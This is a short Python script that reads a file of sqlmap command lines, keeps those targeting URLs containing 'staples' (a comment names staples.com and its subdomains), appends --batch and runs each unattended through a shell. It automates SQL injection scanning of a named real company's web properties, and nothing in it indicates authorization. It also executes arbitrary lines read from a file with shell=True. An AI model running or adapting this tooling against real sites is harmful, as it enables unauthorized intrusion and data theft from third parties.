import subprocess
import re

file_path = 'PATH_TO_FILE'
filter_string = 'staples'

def command_activate(command):

    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        while True:
            line = process.stdout.readline()
            if not line:
                break
            print(line.strip())
        return_code = process.poll()
        if return_code != 0:
            raise subprocess.CalledProcessError(return_code, command)
        return "SQLMap execution completed successfully"
    except subprocess.CalledProcessError as e:
        return f"Error executing SQLMap: {e}"

def find_correct_urls(file_path,filter_string):

    # List to store the extracted data
    data = []

    # Regular expression pattern to match URL and headers
    pattern = r'python\s+\/opt\/sqlmap-dev\/sqlmap\.py\s+-u\s+"([^"]+)"\s+--headers\s+"([^"]+)'

    with open(file_path, 'r') as file:
        for line in file:
            # Use regex to find matches
            match = re.search(pattern, line)
            if match:
                url = match.group(1).strip()
                # Check if the URL belongs to staples.com or its subdomain
                if 'staples' in url.lower():
                    command = line.replace(url + '"', url + '" --batch')
                    command_activate(command)

find_correct_urls(file_path,filter_string)
